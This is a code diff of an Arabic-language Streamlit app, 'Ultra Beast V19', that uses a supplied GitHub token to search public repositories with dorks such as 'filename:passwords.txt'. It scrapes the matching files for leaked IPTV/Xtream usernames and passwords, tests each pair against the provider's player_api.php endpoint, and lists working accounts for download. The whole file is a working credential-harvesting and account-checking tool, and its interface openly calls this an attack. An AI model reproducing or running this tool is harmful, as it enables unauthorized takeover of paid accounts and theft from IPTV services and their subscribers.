@@ -5,152 +5,185 @@ import time
 from datetime import datetime
 
 # =================================================
-# 1. إعدادات الأمان والتنسيق
+# 1. نظام الأمان والهوية
 # =================================================
-if "password_correct" not in st.session_state:
-    st.session_state.password_correct = False
+LOGIN_PASSWORD = "BEAST_V17_PRO" 
 
-def login():
-    st.markdown("<h1 style='text-align: center; color:#00E676;'>🌪️ ULTRA BEAST V18 PRO</h1>", unsafe_allow_html=True)
-    pwd = st.text_input("Password:", type="password")
-    if st.button("دخول"):
-        if pwd == "BEAST_V18":
-            st.session_state.password_correct = True
+if "auth" not in st.session_state:
+    st.session_state.auth = False
+
+def login_screen():
+    st.markdown("<h1 style='text-align: center; color:#00ff41;'>🌪️ ULTRA BEAST V19 PRO</h1>", unsafe_allow_html=True)
+    st.markdown("<p style='text-align: center; color:#888;'>النسخة المليونية - تحديث الرادار الفوري</p>", unsafe_allow_html=True)
+    pwd = st.text_input("كلمة المرور:", type="password")
+    if st.button("تنشيط المحرك"):
+        if pwd == LOGIN_PASSWORD:
+            st.session_state.auth = True
             st.rerun()
-        else: st.error("❌ خطأ!")
+        else: st.error("❌ الوصول مرفوض")
 
-if not st.session_state.password_correct:
-    login()
+if not st.session_state.auth:
+    login_screen()
     st.stop()
 
-st.set_page_config(page_title="Ultra Beast V18 PRO", layout="wide")
+# =================================================
+# 2. إعدادات الواجهة المتقدمة
+# =================================================
+st.set_page_config(page_title="Ultra Beast V19 - Live", layout="wide")
 
 st.markdown("""
 <style>
-    .stApp { background-color: #0e1117; }
-    .card { background: #1a1c23; border-radius: 10px; padding: 15px; border-left: 5px solid #00E676; margin-bottom: 10px; }
-    .stat-box { background: #262730; padding: 10px; border-radius: 5px; text-align: center; }
-    .log-text { color: #fbbf24; font-family: monospace; font-size: 13px; }
+    .stApp { background-color: #05070a; }
+    .beast-card {
+        background: linear-gradient(145deg, #0d1117, #161b22);
+        border: 1px solid #30363d;
+        border-left: 6px solid #00ff41;
+        padding: 20px;
+        border-radius: 12px;
+        margin-bottom: 15px;
+        box-shadow: 0 4px 15px rgba(0,255,65,0.1);
+    }
+    .status-tag { color: #00ff41; font-weight: bold; font-family: 'Courier New'; font-size: 16px; }
+    .data-label { color: #fbbf24; font-weight: bold; }
+    .data-value { color: #e6edf3; font-family: monospace; }
+    .terminal-text { color: #58a6ff; font-family: 'Consolas', monospace; font-size: 13px; }
 </style>
 """, unsafe_allow_html=True)
 
-# =================================================
-# 2. محرك الفحص المتطور
-# =================================================
-if 'results' not in st.session_state: st.session_state.results = []
-if 'is_hunting' not in st.session_state: st.session_state.is_hunting = False
-if 'stats' not in st.session_state: st.session_state.stats = {"checked": 0, "found": 0}
+# إدارة البيانات
+if 'all_hits' not in st.session_state: st.session_state.all_hits = []
+if 'is_running' not in st.session_state: st.session_state.is_running = False
+if 'counter' not in st.session_state: st.session_state.counter = {"checked": 0, "found": 0}
+if 'cache' not in st.session_state: st.session_state.cache = set()
 
-def check_account(host, user, pw):
+# =================================================
+# 3. محرك الفحص الذكي
+# =================================================
+def check_server(host, user, pw):
+    uid = f"{host}{user}"
+    if uid in st.session_state.cache: return None
+    st.session_state.cache.add(uid)
+
     try:
-        # فحص كلاسيكي سريع (Timeout قصير لعدم تعطيل البحث)
-        api_url = f"{host}/player_api.php?username={user}&password={pw}"
-        r = requests.get(api_url, timeout=4).json()
-        if r.get("user_info", {}).get("status") == "Active":
-            info = r["user_info"]
+        # فحص مباشر وسريع
+        target = f"{host}/player_api.php?username={user}&password={pw}"
+        resp = requests.get(target, timeout=5).json()
+        
+        if resp.get("user_info", {}).get("status") == "Active":
+            info = resp["user_info"]
             exp = datetime.fromtimestamp(int(info['exp_date'])).strftime('%Y-%m-%d') if info.get('exp_date') else "Unlimited"
             return {
                 "host": host, "user": user, "pass": pw, "exp": exp,
-                "conn": f"{info.get('active_cons', '0')}/{info.get('max_connections', '1')}"
+                "max": info.get('max_connections', '1'),
+                "active": info.get('active_cons', '0')
             }
     except: return None
     return None
 
 # =================================================
-# 3. الواجهة الجانبية والتحكم
+# 4. لوحة التحكم والبحث المليوني
 # =================================================
 with st.sidebar:
-    st.image("https://cdn-icons-png.flaticon.com/512/924/924514.png", width=100)
-    st.title("BEAST V18")
-    token = st.text_input("GitHub Token:", type="password")
+    st.title("🛡️ Beast V19")
+    token = st.text_input("GitHub Token:", type="password", placeholder="ghp_xxxx...")
     
-    if st.button("🚀 ابدأ الهجوم المليوني"):
-        if token:
-            st.session_state.is_hunting = True
-            st.session_state.results = []
-            st.session_state.stats = {"checked": 0, "found": 0}
+    col_a, col_b = st.columns(2)
+    with col_a:
+        if st.button("🚀 بدء الهجوم"):
+            if token: 
+                st.session_state.is_running = True
+                st.rerun()
+    with col_b:
+        if st.button("🛑 إيقاف"):
+            st.session_state.is_running = False
             st.rerun()
-        else: st.warning("أدخل التوكن أولاً")
-        
-    if st.button("🛑 إيقاف"):
-        st.session_state.is_hunting = False
-        st.rerun()
 
     st.divider()
-    st.metric("💎 النتائج الشغالة", st.session_state.stats["found"])
-    st.metric("🔍 عدد الفحوصات", st.session_state.stats["checked"])
+    st.metric("💎 شغال", st.session_state.counter["found"])
+    st.metric("🔍 مفحوص", st.session_state.counter["checked"])
+    
+    if st.session_state.all_hits:
+        txt_res = ""
+        for h in st.session_state.all_hits:
+            txt_res += f"HOST: {h['host']}\nUSER: {h['user']} | PASS: {h['pass']}\nEXP: {h['exp']}\n{'-'*40}\n"
+        st.download_button("📥 تحميل الصيد", txt_res, "Beast_V19_Hits.txt")
 
 # =================================================
-# 4. الرادار المباشر (قلب النظام)
+# 5. منطقة العرض المباشر (الرادار)
 # =================================================
-st.subheader("📡 رادار الصيد والتحليل المباشر")
-status_msg = st.empty()
-log_area = st.empty()
+st.subheader("📡 رادار الصيد المباشر (تحديث فوري)")
+log_box = st.empty()
+results_area = st.container()
 
-# عرض النتائج
-for res in st.session_state.results:
-    with st.container():
+# عرض النتائج فوراً
+with results_area:
+    for hit in st.session_state.all_hits:
         st.markdown(f"""
-        <div class="card">
-            <b style="color:#00E676;">✅ ACTIVE | {res['exp']}</b><br>
-            <code>{res['host']}</code><br>
-            👤 {res['user']} | 🔑 {res['pass']} | 🔌 {res['conn']}
+        <div class="beast-card">
+            <div class="status-tag">✅ SERVER ACTIVE</div>
+            <div style="margin-top:10px;">
+                <span class="data-label">Host:</span> <span class="data-value">{hit['host']}</span><br>
+                <span class="data-label">User:</span> <span class="data-value">{hit['user']}</span> | 
+                <span class="data-label">Pass:</span> <span class="data-value">{hit['pass']}</span><br>
+                <span class="data-label">Expiry:</span> <span style="color:#ff7b72;">{hit['exp']}</span> | 
+                <span class="data-label">Connections:</span> <span class="data-value">{hit['active']}/{hit['max']}</span>
+            </div>
         </div>
         """, unsafe_allow_html=True)
 
-# تشغيل عملية البحث
-if st.session_state.is_hunting:
+# تشغيل عملية البحث المليونية
+if st.session_state.is_running:
     headers = {'Authorization': f'token {token}', 'Accept': 'application/vnd.github.v3+json'}
     
-    # دورتات "هجومية" لضمان جلب نتائج
-    dorks = [
+    # قائمة دروكات ضخمة جداً
+    massive_dorks = [
         'extension:txt "get.php?username=" "password="',
         'extension:m3u "player_api.php"',
+        'filename:xtream_codes.txt',
         'iptv xtream 2026',
-        '"http" "username" "password" "port" extension:txt',
-        'filename:iptv_list.txt',
-        'filename:accounts.txt "http"'
+        '"http://" "user" "pass" "port" extension:txt',
+        'filename:iptv.txt "http"',
+        'extension:php "username" "password" "xtream"',
+        'filename:passwords.txt "http" "port"'
     ]
 
-    while st.session_state.is_hunting:
-        for dork in dorks:
-            if not st.session_state.is_hunting: break
+    while st.session_state.is_running:
+        for dork in massive_dorks:
+            if not st.session_state.is_running: break
             
-            for page in range(1, 15):
-                if not st.session_state.is_hunting: break
-                status_msg.info(f"🔎 جاري فحص الدورك: {dork} | صفحة: {page}")
+            for page in range(1, 20): # البحث في 20 صفحة لكل دورك (آلاف النتائج)
+                if not st.session_state.is_running: break
+                
+                log_box.markdown(f"<p class='terminal-text'>🔍 جاري مسح الصفحات: {dork} | صفحة {page}</p>", unsafe_allow_html=True)
                 
                 try:
-                    search_url = f"https://api.github.com/search/code?q={dork}&page={page}&per_page=100"
-                    res = requests.get(search_url, headers=headers).json()
+                    url = f"https://api.github.com/search/code?q={dork}&page={page}&per_page=100"
+                    api_res = requests.get(url, headers=headers).json()
                     
-                    if "items" not in res:
-                        log_area.error(f"⚠️ تنبيه: جيت هاب توقف عن إعطاء نتائج. (السبب: {res.get('message', 'Rate Limit')})")
-                        time.sleep(30) # انتظار لفك الحظر
+                    if "items" not in api_res:
+                        log_box.warning("⏳ جيت هاب يطلب استراحة (Rate Limit).. سأنتظر 20 ثانية.")
+                        time.sleep(20)
                         continue
 
-                    for item in res['items']:
-                        if not st.session_state.is_hunting: break
+                    for item in api_res['items']:
+                        if not st.session_state.is_running: break
                         raw_url = item['html_url'].replace('github.com', 'raw.githubusercontent.com').replace('/blob/', '/')
                         
                         try:
                             content = requests.get(raw_url, timeout=3).text
-                            # Regex مطور يدعم HTTPS والروابط المختلفة
-                            # يبحث عن: http(s)://host:port/...username=...&password=...
+                            # Regex مرن جداً لالتقاط كل الأشكال
                             pattern = r"(https?://[a-zA-Z0-9\.-]+:\d+)/[a-zA-Z\._-]+\?username=([a-zA-Z0-9\._-]+)&password=([a-zA-Z0-9\._-]+)"
                             matches = re.findall(pattern, content)
                             
                             for m in matches:
-                                host, user, pw = m[0], m[1], m[2]
-                                st.session_state.stats["checked"] += 1
+                                st.session_state.counter["checked"] += 1
+                                log_box.markdown(f"<p class='terminal-text'>⚡ فحص: {m[0]}</p>", unsafe_allow_html=True)
                                 
-                                log_area.markdown(f"<p class='log-text'>⚡ فحص: {host}...</p>", unsafe_allow_html=True)
-                                
-                                found = check_account(host, user, pw)
-                                if found:
-                                    st.session_state.results.insert(0, found)
-                                    st.session_state.stats["found"] += 1
-                                    st.rerun()
+                                result = check_server(m[0], m[1], m[2])
+                                if result:
+                                    st.session_state.all_hits.insert(0, result)
+                                    st.session_state.counter["found"] += 1
+                                    st.rerun() # تحديث الواجهة فوراً عند كل صيد
                         except: continue
                 except: continue
-                time.sleep(2) # حماية من الحظر
+                time.sleep(1)
